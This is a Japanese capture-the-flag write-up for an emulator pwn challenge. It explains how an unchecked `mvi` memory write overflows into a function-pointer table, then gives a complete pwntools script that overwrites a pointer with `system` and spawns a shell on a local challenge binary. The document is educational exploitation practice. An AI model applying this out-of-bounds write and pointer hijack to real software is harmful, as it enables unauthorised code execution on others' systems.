# writeup - Writeup

`struct emulator`は

```c
srtuct emulator {
    char registars[13];
    char memory[0x4000];
    void (*instructions[0xff])(struct emulator*);
};
```

のように定義されており，各命令はこの構造体のポインタを受け取って操作している．

`mvi`命令で，`emulator.memory`の任意のオフセットにデータを直接書き込めるので，`memory`の範囲を超えて`instructions`を上書きすることができる．

運良く`system`が使われているので，これを利用してshellを取る．

```python3
#!/bin/env python3
from pwn import *
binfile = './chall'
context.log_level = 'critical'
e = ELF(binfile)
context.binary = binfile
# io = remote()
io = process(binfile)

def mvi(r, d):
    if r == 'A':
        return bytes([0x3E, d])
    elif r == 'B':
        return bytes([0x06, d])
    elif r == 'C':
        return bytes([0x0E, d])
    elif r == 'D':
        return bytes([0x16, d])
    elif r == 'E':
        return bytes([0x1E, d])
    elif r == 'H':
        return bytes([0x26, d])
    elif r == 'L':
        return bytes([0x2E, d])
    elif r == 'M':
        return bytes([0x36, d])


system_addr = e.sym['system']


payload = mvi('H', 0x40)                        # memory[0x4000]
payload += mvi('L', 0x0c)                       # memory[0x400c]
payload += mvi('M', system_addr & 0xff)         # memory[0x400c] = system_addr & 0xff
payload += mvi('L', 0x0d)                       # memory[0x400d]
payload += mvi('M', system_addr >> 8 & 0xff)    # memory[0x400d] = system_addr >> 8 & 0xff
payload += mvi('L', 0x0e)                       # memory[0x400e]
payload += mvi('M', system_addr >> 16 & 0xff)   # memory[0x400e] = system_addr >> 16 & 0xff
payload += mvi('A', ord('s'))
payload += mvi('B', ord('h'))
payload += mvi('C', 0)
payload += bytes([0x00, 0x01, 0xc9])

io.recvuntil(b'loading to memory...')
io.send(payload)
io.recvuntil(b'running emulator...')
io.interactive()
```
